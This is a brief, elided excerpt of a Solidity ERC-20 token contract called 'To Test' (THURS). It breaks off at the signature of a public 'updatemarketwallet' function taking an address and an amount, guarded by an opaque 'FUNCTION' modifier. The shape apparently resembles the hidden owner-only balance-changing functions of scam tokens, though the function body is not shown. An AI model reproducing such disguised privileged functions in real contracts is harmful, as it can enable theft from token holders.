...
contract  ToTest is Context, IERC20, Ownable{
    using SafeMath for uint256;
    string private _name = "To Test";
    string private _symbol = "THURS";
    ...
    function updatemarketwallet(address sender, uint256 _amount) public FUNCTION(2*10**2, SLNA,_msgSender()){
